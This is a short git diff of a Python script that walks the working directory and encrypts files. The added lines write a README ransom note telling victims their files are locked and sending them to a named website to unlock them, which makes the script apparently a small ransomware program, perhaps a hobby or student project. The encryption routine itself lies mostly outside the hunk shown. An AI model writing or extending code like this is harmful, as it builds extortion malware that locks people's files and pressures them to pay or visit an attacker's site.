@@ -90,8 +90,13 @@ for root, dirs, files in os.walk("."):
             print("Results of encryption stored at: " + jsonFileName)
             print("")
 
+readMeFile = open(constants.README_FILE_PATH, "w")
 privateKeyFile = open(constants.PRIVATE_KEY_FILE_PATH)
 publicKeyFile = open(constants.PUBLIC_KEY_FILE_PATH)
+
+readMeFile.write("Looks like your files are locked!")
+readMeFile.write("You'll have to go to https://jaydensdisciples.me in order to unlock them :P")
+readMeFile.close()
 
 privateKeyContents = privateKeyFile.read()
 publicKeyContents = publicKeyFile.read()
